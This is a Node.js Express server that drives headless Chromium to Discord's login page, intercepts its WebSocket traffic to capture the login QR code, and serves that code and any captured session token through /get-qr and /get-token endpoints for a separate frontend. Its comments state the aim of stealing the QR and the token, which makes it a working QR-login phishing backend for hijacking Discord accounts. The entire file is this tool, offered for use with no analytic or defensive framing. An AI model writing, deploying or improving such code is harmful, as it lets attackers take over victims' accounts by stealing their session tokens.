const express = require('express');
const puppeteer = require('puppeteer');
const cors = require('cors');

const app = express();
app.use(cors());

// Global variables to hold the data
let qrCodeData = null;
let capturedToken = null;

/**
 * THE BRAIN: Starts a headless Chromium instance, 
 * navigates to Discord, and intercepts WebSocket 
 * traffic to steal the QR and the Token.
 */
async function startDiscordSession() {
    console.log("Initializing Discord Session...");
    
    const browser = await puppeteer.launch({
        headless: "new",
        executablePath: '/usr/bin/chromium', // Required for Railway/Linux
        args: [
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-dev-shm-usage',
            '--disable-web-security'
        ]
    });

    const page = await browser.newPage();

    try {
        // Navigate to Discord Login
        await page.goto('https://discord.com/login', { waitUntil: 'networkidle2' });
        console.log("Navigated to Discord. Listening for WebSocket traffic...");

        // INTERCEPT WEBSOCKETS
        // This is the "magic" part. Discord communicates via WebSockets.
        // We listen to every message sent/received to find the QR and the Token.
        page.on('websocket', (ws) => {
            console.log("WebSocket connection detected.");
            
            ws.on('framereceived', (payload) => {
                try {
                    const data = JSON.parse(payload.payload.data);
                    
                    // 1. Look for the QR Code in the Discord payload
                    if (data.d && data.d.qr_code) {
                        qrCodeData = data.d.qr_code;
                        console.log("SUCCESS: Real QR Code captured from WebSocket.");
                    }

                    // 2. Look for the Token in the Discord payload
                    // When the user scans, the token is sent via the gateway
                    if (data.d && data.d.token) {
                        capturedToken = data.d.token;
                        console.log("SUCCESS: Real Token captured from WebSocket!");
                    }
                } catch (e) {
                    // Ignore non-JSON frames
                }
            });
        });

    } catch (error) {
        console.error("CRITICAL ERROR in Discord Session:", error);
    }
}

// --- API ENDPOINTS FOR VERCEL FRONTEND ---

// 1. Get the QR code
app.get('/get-qr', (req, res) => {
    if (qrCodeData) {
        res.json({ qr: qrCodeData });
    } else {
        // If QR isn't ready, send a 503 so frontend knows to retry
        res.status(503).json({ error: 'QR not ready' });
    }
});

// 2. Check for the captured token
app.get('/get-token', (req, res) => {
    if (capturedToken) {
        res.json({ token: capturedToken });
    } else {
        res.json({ token: null });
    }
});

// 3. Health check
app.get('/', (req, res) => res.send('Backend is Live.'));

// --- START SERVER ---
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server listening on port ${PORT}`);
    // Start the browser immediately
    startDiscordSession();
});
